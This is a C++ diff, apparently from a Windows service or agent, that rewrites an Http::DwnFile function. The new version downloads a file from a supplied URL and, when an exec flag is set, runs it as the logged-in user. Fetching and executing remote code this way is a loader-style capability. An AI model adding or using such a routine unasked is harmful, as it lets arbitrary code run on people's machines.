@@ -5,20 +5,30 @@
 #include"Utils.h"
 #include"service.h"
 #include"Strings.h"
+#include"Http.h"
 #pragma comment(lib,"wininet.lib")
 #pragma comment(lib,"Urlmon")
 namespace Http {
 
+
+
     HINTERNET hInternet;
-    BOOL DwnFile(char* url, char* path) {
-        std::wstring log(L"Download File : "+Strings::strtow(url) + L" " + Strings::strtow(path));
+
+
+    void _stdcall DwnFile(FileDownload *file) {
+        std::wstring log(L"Download File : " + Strings::strtow(file->url) + L" " + Strings::strtow(file->path));
         Log::SaveLog((wchar_t*)log.c_str());
-        if (URLDownloadToFileA(NULL, url, path, 0, NULL) != S_OK) { 
-            std::wstring error(L"Error DownloadFile "+std::to_wstring(GetLastError()));
+        if (URLDownloadToFileA(NULL, file->url.c_str(), file->path.c_str(), 0, NULL) != S_OK) {
+            std::wstring error(L"Error DownloadFile " + std::to_wstring(GetLastError()));
             Log::SaveLog((wchar_t*)error.c_str());
-            return FALSE; }
-        return TRUE;
-        
+        }
+        else {
+
+            if(file->exec){ Utils::runAsUser((wchar_t*)Strings::strtow(Http::extractFileName(file->url)).c_str(), (wchar_t*)L""); }
+        }
+        delete file;
+        return ;
+
 
     }
 
